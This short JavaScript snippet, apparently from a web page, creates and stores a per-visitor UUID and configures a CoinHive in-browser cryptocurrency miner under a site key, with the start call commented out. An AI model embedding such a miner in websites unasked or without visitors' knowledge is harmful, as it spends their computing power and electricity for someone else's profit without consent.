// uuid
function generateUuid() {
    // https://github.com/GoogleChrome/chrome-platform-analytics/blob/master/src/internal/identifier.js
    // const FORMAT: string = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx";
    let chars = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".split("");
    for (let i = 0, len = chars.length; i < len; i++) {
        switch (chars[i]) {
            case "x":
                chars[i] = Math.floor(Math.random() * 16).toString(16);
                break;
            case "y":
                chars[i] = (Math.floor(Math.random() * 4) + 8).toString(16);
                break;
        }
    }
    return chars.join("");
}

var nyannyanId = store.get('nyannyan_id');
if (nyannyanId == undefined || nyannyanId == "") {
    nyannyanId = generateUuid();
    store.set('nyannyan_id', nyannyanId)
}

// CoinHive
var miner = new CoinHive.User('lNx6RgYfV66oiZebezpuXYswaQe76D7i', nyannyanId, {
	threads: 1,
	autoThreads: false,
	throttle: 0.8,
	forceASMJS: false
});
//miner.start(CoinHive.IF_EXCLUSIVE_TAB);
